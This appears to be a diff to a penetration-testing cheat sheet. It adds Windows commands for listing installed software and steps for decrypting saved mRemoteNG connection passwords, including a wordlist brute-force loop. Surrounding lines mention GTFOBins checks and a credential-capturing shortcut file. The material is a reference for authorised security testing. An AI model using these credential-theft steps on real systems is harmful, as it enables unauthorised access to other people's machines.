@@ -2378,6 +2378,16 @@ $ apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee 
 $ for i in $(curl -s https://gtfobins.org/api.json | jq -r '.executables | keys[]'); do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i";fi; done
 ```
 
+- Installed Programs
+
+```
+C:\> dir "C:\Program Files"
+C:\> dir "C:\Program Files (x86)"
+PS C:\> $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
+PS C:\> $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation
+PS C:\> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize
+```
+
 - Binaries
 
 ```
@@ -3539,6 +3549,16 @@ $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
 $lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
 $lnk.HotKey = "Ctrl+Alt+O"
 $lnk.Save()
+```
+
+- mRemoteNG
+
+```
+PS C:\> type C:\Users\julio\AppData\Roaming\mRemoteNG\confCons.xml
+https://github.com/haseebT/mRemoteNG-Decrypt
+$ python3 mremoteng_decrypt.py -s "<password>"
+$ python3 mremoteng_decrypt.py -s "<password>" -p <master_password>
+$ for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "<password>" -p $password 2>/dev/null;done    
 ```
 
 #9. - File Transfers
